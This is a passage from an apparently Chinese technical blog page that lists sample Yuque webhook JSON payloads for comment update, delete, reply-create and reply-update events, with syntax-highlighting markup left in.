class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;deleted_at&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:40:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:44:46.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;first_published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;word_count&quot;</span>: <span class="hljs-number">21</span>,<br>      <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.doc_detail&quot;</span>,<br>      <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu#reply-857182&quot;</span>,<br>    <span class="hljs-attr">&quot;action_type&quot;</span>: <span class="hljs-string">&quot;comment_update&quot;</span>,<br>    <span class="hljs-attr">&quot;webhook_subject_type&quot;</span>: <span class="hljs-string">&quot;comment_update&quot;</span>,<br>    <span class="hljs-attr">&quot;actor_id&quot;</span>: <span class="hljs-number">593074</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="删除评论"><a href="#删除评论" class="headerlink" title="删除评论"></a>删除评论</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">857182</span>,<br>    <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>    <span class="hljs-attr">&quot;parent_id&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&lt;p data-lake-id=\&quot;a20d224c568e48b9d67847a2c66a8c01_p_0\&quot;&gt;更新了评论，删除了一级标题&lt;/p&gt;&quot;</span>,<br>    <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;mood&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:44:46.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:45:09.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;to_user_id&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;user&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;User&quot;</span>,<br>      <span class="hljs-attr">&quot;login&quot;</span>: <span class="hljs-string">&quot;flamingcrystal&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Flaming Crystal&quot;</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;avatar_url&quot;</span>: <span class="hljs-string">&quot;https://cdn.nlark.com/yuque/0/2019/jpeg/anonymous/1573519967166-e0d21489-4ab5-49b6-8893-7e77c44cd2b5.jpeg&quot;</span>,<br>      <span class="hljs-attr">&quot;followers_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;following_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2019-11-12T00:53:12.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.user&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.comment_detail&quot;</span>,<br>    <span class="hljs-attr">&quot;commentable&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">13230337</span>,<br>      <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;qddytu&quot;</span>,<br>      <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;这是文章的标题&quot;</span>,<br>      <span class="hljs-attr">&quot;book_id&quot;</span>: <span class="hljs-number">1782464</span>,<br>      <span class="hljs-attr">&quot;book&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">1782464</span>,<br>        <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Book&quot;</span>,<br>        <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;tx5fs5&quot;</span>,<br>        <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;示例知识库&quot;</span>,<br>        <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;点滴学习，随时记录&quot;</span>,<br>        <span class="hljs-attr">&quot;creator_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;items_count&quot;</span>: <span class="hljs-number">3</span>,<br>        <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">&quot;watches_count&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.966Z&quot;</span>,<br>        <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:58.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.book&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;format&quot;</span>: <span class="hljs-string">&quot;lake&quot;</span>,<br>      <span class="hljs-attr">&quot;body&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_draft&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;view_status&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;read_status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;comments_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;deleted_at&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:40:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:45:54.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;first_published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;word_count&quot;</span>: <span class="hljs-number">21</span>,<br>      <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.doc_detail&quot;</span>,<br>      <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu#reply-857182&quot;</span>,<br>    <span class="hljs-attr">&quot;action_type&quot;</span>: <span class="hljs-string">&quot;comment_delete&quot;</span>,<br>    <span class="hljs-attr">&quot;webhook_subject_type&quot;</span>: <span class="hljs-string">&quot;comment_delete&quot;</span>,<br>    <span class="hljs-attr">&quot;actor_id&quot;</span>: <span class="hljs-number">593074</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="新增评论回复"><a href="#新增评论回复" class="headerlink" title="新增评论回复"></a>新增评论回复</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">857191</span>,<br>    <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>    <span class="hljs-attr">&quot;parent_id&quot;</span>: <span class="hljs-number">857190</span>,<br>    <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&lt;p data-lake-id=\&quot;a20d224c568e48b9d67847a2c66a8c01_p_0\&quot;&gt;新增评论回复&lt;/p&gt;&quot;</span>,<br>    <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;mood&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:47:25.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:47:25.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;to_user_id&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;user&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;User&quot;</span>,<br>      <span class="hljs-attr">&quot;login&quot;</span>: <span class="hljs-string">&quot;flamingcrystal&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Flaming Crystal&quot;</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;avatar_url&quot;</span>: <span class="hljs-string">&quot;https://cdn.nlark.com/yuque/0/2019/jpeg/anonymous/1573519967166-e0d21489-4ab5-49b6-8893-7e77c44cd2b5.jpeg&quot;</span>,<br>      <span class="hljs-attr">&quot;followers_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;following_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2019-11-12T00:53:12.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.user&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.comment_detail&quot;</span>,<br>    <span class="hljs-attr">&quot;commentable&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">13230337</span>,<br>      <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;qddytu&quot;</span>,<br>      <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;这是文章的标题&quot;</span>,<br>      <span class="hljs-attr">&quot;book_id&quot;</span>: <span class="hljs-number">1782464</span>,<br>      <span class="hljs-attr">&quot;book&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">1782464</span>,<br>        <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Book&quot;</span>,<br>        <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;tx5fs5&quot;</span>,<br>        <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;示例知识库&quot;</span>,<br>        <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;点滴学习，随时记录&quot;</span>,<br>        <span class="hljs-attr">&quot;creator_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;items_count&quot;</span>: <span class="hljs-number">2</span>,<br>        <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">&quot;watches_count&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.966Z&quot;</span>,<br>        <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:46:55.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.book&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;format&quot;</span>: <span class="hljs-string">&quot;lake&quot;</span>,<br>      <span class="hljs-attr">&quot;body&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_draft&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;view_status&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;read_status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;comments_count&quot;</span>: <span class="hljs-number">2</span>,<br>      <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;deleted_at&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:40:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:47:25.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;first_published_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:42:28.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;word_count&quot;</span>: <span class="hljs-number">21</span>,<br>      <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.doc_detail&quot;</span>,<br>      <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;flamingcrystal/tx5fs5/qddytu#reply-857191&quot;</span>,<br>    <span class="hljs-attr">&quot;action_type&quot;</span>: <span class="hljs-string">&quot;comment_reply_create&quot;</span>,<br>    <span class="hljs-attr">&quot;webhook_subject_type&quot;</span>: <span class="hljs-string">&quot;comment_reply_create&quot;</span>,<br>    <span class="hljs-attr">&quot;actor_id&quot;</span>: <span class="hljs-number">593074</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="更新评论回复"><a href="#更新评论回复" class="headerlink" title="更新评论回复"></a>更新评论回复</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">857191</span>,<br>    <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>    <span class="hljs-attr">&quot;parent_id&quot;</span>: <span class="hljs-number">857190</span>,<br>    <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&lt;p data-lake-id=\&quot;a20d224c568e48b9d67847a2c66a8c01_p_0\&quot;&gt;更新评论回复&lt;/p&gt;&quot;</span>,<br>    <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;mood&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:47:25.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:47:35.000Z&quot;</span>,<br>    <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;to_user_id&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">&quot;user&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;User&quot;</span>,<br>      <span class="hljs-attr">&quot;login&quot;</span>: <span class="hljs-string">&quot;flamingcrystal&quot;</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Flaming Crystal&quot;</span>,<br>      <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;avatar_url&quot;</span>: <span class="hljs-string">&quot;https://cdn.nlark.com/yuque/0/2019/jpeg/anonymous/1573519967166-e0d21489-4ab5-49b6-8893-7e77c44cd2b5.jpeg&quot;</span>,<br>      <span class="hljs-attr">&quot;followers_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;following_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2019-11-12T00:53:12.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.user&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;webhook.comment_detail&quot;</span>,<br>    <span class="hljs-attr">&quot;commentable&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">13230337</span>,<br>      <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;qddytu&quot;</span>,<br>      <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;这是文章的标题&quot;</span>,<br>      <span class="hljs-attr">&quot;book_id&quot;</span>: <span class="hljs-number">1782464</span>,<br>      <span class="hljs-attr">&quot;book&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-number">1782464</span>,<br>        <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Book&quot;</span>,<br>        <span class="hljs-attr">&quot;slug&quot;</span>: <span class="hljs-string">&quot;tx5fs5&quot;</span>,<br>        <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;示例知识库&quot;</span>,<br>        <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;点滴学习，随时记录&quot;</span>,<br>        <span class="hljs-attr">&quot;creator_id&quot;</span>: <span class="hljs-number">593074</span>,<br>        <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;items_count&quot;</span>: <span class="hljs-number">2</span>,<br>        <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">&quot;watches_count&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.966Z&quot;</span>,<br>        <span class="hljs-attr">&quot;updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:46:55.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:39:58.000Z&quot;</span>,<br>        <span class="hljs-attr">&quot;user&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-attr">&quot;_serializer&quot;</span>: <span class="hljs-string">&quot;v2.book&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;user_id&quot;</span>: <span class="hljs-number">593074</span>,<br>      <span class="hljs-attr">&quot;format&quot;</span>: <span class="hljs-string">&quot;lake&quot;</span>,<br>      <span class="hljs-attr">&quot;body&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_draft&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;body_html&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;public&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;view_status&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;read_status&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;likes_count&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;comments_count&quot;</span>: <span class="hljs-number">2</span>,<br>      <span class="hljs-attr">&quot;content_updated_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:43:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;deleted_at&quot;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-attr">&quot;created_at&quot;</span>: <span class="hljs-string">&quot;2020-09-15T10:40:57.000Z&quot;</span>,<br>      <span class="hljs-attr">&quot;updated_at&quot;</span>: <span 